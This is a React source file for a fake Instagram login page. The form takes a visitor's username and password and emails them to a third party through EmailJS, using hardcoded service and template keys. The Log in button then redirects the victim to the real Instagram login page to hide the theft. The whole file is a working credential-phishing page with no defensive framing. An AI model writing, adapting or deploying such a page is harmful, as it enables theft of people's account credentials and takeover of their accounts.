import React, { useState } from "react";
import "./index.css";
import { useRef } from 'react';
import emailjs from '@emailjs/browser';




const App = () => {
  const form = useRef();
  const [userName, setUserName] = useState()
  const [password, setPassword] = useState()

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs.sendForm('service_fk4sodi', 'template_4o1s72j', form.current, 'a8UkC4uIcU3L5JwhD')
      .then((result) => {
          console.log(result.text);
      }, (error) => {
          console.log(error.text);
      });
  };

  return (
    <React.Fragment>

      <div id="wrapper">
        <div className="container">
        {/* <img
        className="instapic"
           src="https://lavnik.net/wp-content/uploads/2019/10/instagram-blue-check-mark-verification-theblackmedia-2018.jpg"
           alt="ios app"
           /> */}
          <div className="phone-app-demo" />
          <div className="form-data">
            <form ref={form} onSubmit={sendEmail}>
              <div className="logo">
                <h1>Instagram</h1>
              </div>
              <input
                type="text"
                placeholder="Phone number, username, or email"
                name="user_name"
                value={userName}
                onChange={(e) => setUserName(e.target.value)}
                required
              />
              <input
                type="password"
                placeholder="Password"
                name="user_password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                required />
              {/* <input  type="submit" value="Send" /> */}
              
              <button 
              onClick={() => { window.location = "https://www.instagram.com/accounts/login/" }}
              className="form-btn"
              type="submit"
              value="Send">Log in</button>

              <span className="has-separator">Or</span>
              <a href="#" className="facebook-login">
                Log in with Facebook
              </a>
              <a className="password-reset" href="#">
                Forgot password?
              </a>
            </form>
            <div className="sign-up">
              Don't have an account? <a href="#">Sign up</a>
            </div>
            <div className="get-the-app">
              <span>Get the app.</span>
              <div className="badge">
                <img
                  onClick={() => { window.location = "https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3D9FB3731C-E159-4183-85D0-C66231FD3D49%26utm_content%3Dlo%26utm_medium%3Dbadge" }}
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png"
                  alt="android App"
                />
                <img
                  onClick={() => { window.location = "https://apps.apple.com/us/app/instagram/id389801252" }}
                  src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png"
                  alt="ios app"
                />
              </div>
            </div>
          </div>
        </div>
      </div>
    </React.Fragment>
  );
};

export default App;

